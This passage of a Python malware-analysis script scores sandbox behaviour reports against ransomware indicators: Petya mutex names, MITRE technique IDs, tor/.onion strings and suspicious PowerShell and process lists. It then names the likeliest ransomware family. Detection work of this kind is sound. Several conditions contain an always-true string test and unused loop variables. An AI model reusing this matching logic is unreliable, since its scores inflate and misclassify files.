                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
        #print("Total modules_loaded est : "+str(len(dictionary["data"]["modules_loaded"]))+"/"+str(total))
    except KeyError :
        total += 0
    #dns_lookups
    try :
        for i in dictionary["data"]["dns_lookups"]:
            for j in URLS_SUSPECTS:
                if j in i["hostname"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["resolved_ips"]:
                    total += 1
            
        #print("Total dns_lookups est : "+str(len(dictionary["data"]["dns_lookups"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_domains
    try :
        
        for i in dictionary["data"]["memory_pattern_domains"]:
            for j in URLS_SUSPECTS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # memory_pattern_ips
    try :
        for i in dictionary["data"]["memory_pattern_ips"]:
            for j in SUSPICIOUS_NETWORK_IPS:
                if j.lower() in i.lower() :
                    total += 1
        #print("Total  memory_pattern_domains est : "+str(len(dictionary["data"]["memory_pattern_domains"]))+"/"+str(total))
    except KeyError :
        total += 0
    # mutexes created
    mutex = ["Global\\","_!MSFTHISTORY!_","System1230123","dslhufdks3","uyfgdvcghuasd",r"\Sessions\1\BaseNamedObjects"]
    try :
        for i in dictionary["data"]["mutexes_created"]:
            for j in mutex:
                if j in i:
                    total += 1
        for i in dictionary["data"]["mutexes_opened"]:
            for j in mutex:
                if j in i:
                    total += 1
        #print("Total mutexes created and opened est : "+str(len(dictionary["data"]["mutexes_created"]))+"/"+str(total))
    except KeyError :
        total += 0

    # text_decoded
    try :
        
        for i in dictionary["data"]["text_decoded"]:
            if "petya" in i:
                total += 1
            for j in NT_DETECTED:
                if j in i:
                    total += 1
    except KeyError :
        total += 0

    # files_opened
    try :
        
        for i in dictionary["data"]["files_opened"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
    except KeyError:
        total += 0

    #registry_keys_set
    try :
        
        for i in dictionary["data"]["registry_keys_set"]:
            for j in i:
                if j in "key":
                    for k in petya_REGISTRY_KEYS:
                        if k in i[j]:
                            total +=1
        
        #print("Total registry_keys_set est : "+str(len(dictionary["data"]["registry_keys_set"]))+"/"+str(total))
    except KeyError :
        total += 0
        
    # registry_keys_deleted
    try :
        
        for i in dictionary["data"]["registry_keys_deleted"]:
            for j in petya_REGISTRY_KEYS:
                if j in i:
                    total +=1
        
        #print("Total registry_keys_deleted est : "+str(len(dictionary["data"]["registry_keys_deleted"]))+"/"+str(total))
    except KeyError :
        total += 0

    # processes_created
    try :
        
        for i in dictionary["data"]["processes_created"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in power_shell_cmd:
                if j in i:
                    total += 1
        #print("Total processes_created est : "+str(len(dictionary["data"]["processes_created"]))+"/"+str(total))
    except KeyError:
        total += 0

    # attack_techniques
    try :
        mitre_techniques = ["T1486","T1105","T1102","T1104","T1003","T1049","T1048","T1057","T1055","T1053","T1059","T1007","T1012","T1018","T1027",
                            "T1033","T1035","T1043","T1082","T1096","T1099","T1100","T1134","T1140","T1143","T1172","T1193","T1195","T1204","T1210",
                            "T1560","T1096","T1095","T1173","T1192","T1203","T1218","T1220","T1070","T1021","T1024","T1056","T1058","T1064","T1065",
                            "T1090","T1114","T1132","T1145"]
        
        for i in dictionary["data"]["attack_techniques"]:
            for j in mitre_techniques:
                if j in i:
                    total += 1
        #print("Total total est : "+str(len(dictionary["data"]["mitre_attack_techniques"]))+"/"+str(total))
    except KeyError:
        total += 0

    # ip_traffic
    
    try :
        for i in dictionary["data"]["ip_traffic"]:
            for j in i:
                if j in "destination_ip":
                    for k in SUSPICIOUS_NETWORK_IPS:
                        if k in i[j]:
                            total += 1
                if j in "destination_port":
                    for k in SUSPICIOUS_NETWORK_PORT:
                        if k == i[j]:
                            total += 1
        #print("Total ip_traffic est : "+str(5*len(dictionary["data"]["ip_traffic"]))+"/"+str(total))
    except KeyError:
        total += 0
    
    # files_copied
    
    try :
        for i in dictionary["data"]["files_copied"]:
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i["destination"].lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i["destination"] or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i["destination"] or ".dll" in i["destination"]:
                            total += 1
                        else :
                            total += 0
        #print("Total files_copied est : "+str(4 * len(dictionary["data"]["files_copied"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_written
    try :
        
        for i in dictionary["data"]["files_written"]:
            for j in petya_EXTENSIONS:
                if j.lower() in i.lower():
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j.lower() in i.lower():
                    total += 1
            for j in PATH_RANSOMWARE:
                if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                        if ".exe" in i or ".dll" in i:
                            total += 1
                        else :
                            total += 0
            
        #print("Total files_written est : "+str(len(dictionary["data"]["files_written"]))+"/"+str(total))
    except KeyError:
        total += 0

    # files_dropped
    try :
        
        for i in dictionary["data"]["files_dropped"]:
            for j in i:
                if "path" in j:
                    for k in petya_EXTENSIONS:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in SUSPICIOUS_PROCESS_NAMES:
                        if k.lower() in i[j].lower():
                            total += 1
                    for k in PATH_RANSOMWARE:
                        if "%SAMPLEPATH%" in i or "${SamplePath}" in j or r"C:\Users\<User>\AppData\Local":
                            if ".exe" in i or ".dll" in i:
                                total += 1
                            else :
                                total += 0
            
        #print("Total files_dropped est : "+str(len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    # command_executions
    try :
        
        for i in dictionary["data"]["command_executions"]:
            for j in power_shell_cmd :
                if j in i:
                    total += 1
            for j in SUSPICIOUS_PROCESS_NAMES:
                if j in i:
                    total += 1
        #print("Total command_executions est : "+str(2*len(dictionary["data"]["files_dropped"]))+"/"+str(total))
    except KeyError:
        total += 0

    
    # memory_pattern_urls
    try :
        
        for i in dictionary["data"]["memory_pattern_urls"]:
            for j in URLS_SUSPECTS:
                if j in i:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i:
                    total += 1
            
        #print("Total memory_pattern_urls est : "+str(len(dictionary["data"]["memory_pattern_urls"]))+"/"+str(total))
    except KeyError:
        total += 0
    # http_conversations
    try :
        for i in dictionary["data"]["http_conversations"]:
            for j in URLS_SUSPECTS:
                if j in i["url"]:
                    total += 1
            for j in SUSPICIOUS_NETWORK_IPS:
                if j in i["url"]:
                    total += 1
            if "tor2web" in i or "tor" in i or ".onion" in i:
                total += 1
            
        #print("Total http_conversations est : "+str(len(dictionary["data"]["http_conversations"]))+"/"+str(total))
    except KeyError:
        total += 0
    # Calculate the probs
    #print("[TeslaCrypt] ~ La somme de tout est : "+str(total))
    return total

def generate_json(filename):
    os.chdir('/home/narimene/APP_PFE/static/uploads')
    json_file = load_and_read_json()
    exe_file = load_and_read_exe(filename)
    with open(json_file) as f:
        report_data = f.read()
    dictionary = json.loads(report_data)
    Initial_Connection(dictionary[exe_file]["md5Hash"],exe_file)
    print("["+str(now)+"]~ The behaviour repport has been created!")

def behav_analysis(filename):
    ALL_DATA_HERE = {}
    os.chdir('/home/narimene/APP_PFE/static/uploads')
    json_file = load_and_read_json2()
    if not Exeception_length(json_file):
        if not Exception_Verdicts(json_file):
            ALL_DATA_HERE["Lockbit"] = check_for_lockbit_behaviors(json_file)
            ALL_DATA_HERE["Wannacry"] = check_for_wannacry_behaviors(json_file)
            ALL_DATA_HERE["Conti"] = check_for_conti_behaviors(json_file)
            ALL_DATA_HERE["Maze"] = check_for_maze_behaviors(json_file)
            ALL_DATA_HERE["Revil/Sodinokibi"] = check_for_revil_Sodinokibi_behaviors(json_file)
            ALL_DATA_HERE["Locky"] = check_for_locky_behaviors(json_file)
            ALL_DATA_HERE["Petya/NotPetya"] = check_for_petya_behaviors(json_file)
            ALL_DATA_HERE["TeslaCrypt"] = check_for_TeslaCrypt_behaviors(json_file)
            # ALPHV - BLACKCAT - BLACK MATTER - CACTUS - CHAOS - MONEYMESSAGE - GRANCRAB - DHARMA - PHOBOS
            
            #print(ALL_DATA_HERE)
            max = ""
            cpt = 0
            for i in ALL_DATA_HERE:
                if ALL_DATA_HERE[i] > cpt:
                    cpt = ALL_DATA_HERE[i]
                    max = i
            print("["+str(now)+"]~ The behaviour of the file has been done successful!")
            return False, "The ransomware famillie of the file is "+str(max), max
        else: # Pour eviter les faux positives
            print("["+str(now)+"]~ The behaviour of the file has been done successful!")
            return True, "Exception has been handle it, The file probably be clean", ""
    else: # Pour eviter les exectpion lorsque un ransomware tres tres vieux
        with open(json_file) as f:
            report_data = f.read()
        dictionary = json.loads(report_data)
        if "error" in dictionary:
            print("["+str(now)+"]~ The behaviour of the file has been done successful!")
            return False, "Exception has been handle it, The file probably be clean", ""
        else:
            print("["+str(now)+"]~ The behaviour of the file has been done successful!")
            return False, "Exception has been handle it, we can not found the file for the behaviour analysis OR the file probably be clean", ""
